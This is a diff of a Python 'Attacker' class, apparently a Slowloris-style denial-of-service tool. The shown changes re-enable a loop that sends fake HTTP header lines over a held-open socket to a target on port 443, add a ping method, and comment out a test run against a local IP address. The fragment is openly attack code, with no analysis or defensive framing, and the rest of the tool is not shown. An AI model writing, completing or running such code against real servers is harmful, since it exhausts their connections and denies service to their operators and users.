@@ -37,13 +37,13 @@ class Attacker:
 
 
             #Send fake header elements to target
-            #for element in self.fakeHeaderList:
-             #   self.loris.send(bytes(bytes("{}\r\n".format(element).encode("utf-8"))))
+            for element in self.fakeHeaderList:
+                self.loris.send(bytes(bytes("{}\r\n".format(element).encode("utf-8"))))
 
 
-            info = self.loris.recv(10000)
+            #info = self.loris.recv(10000)
 
-            print(info.decode("utf-8"))
+           # print(info.decode("utf-8"))
 
 
             self.status = "Connected to " + self.target + " Target on port 443"
@@ -72,7 +72,13 @@ class Attacker:
     def returnStatus(self):
         return self.status
 
-test = Attacker("192.168.0.243")
-test.createSocket()
-test.stayAlive()
-#test.attackTarget()
+    def ping(self):
+
+        request = "GET / HTTP/1.0\r\n\r\n"
+        self.loris.send(request.encode())
+
+        info = self.loris.recv(1000000)
+
+        print(info.decode("utf-8"))
+
+#test = Attacker("192.168.0.243")
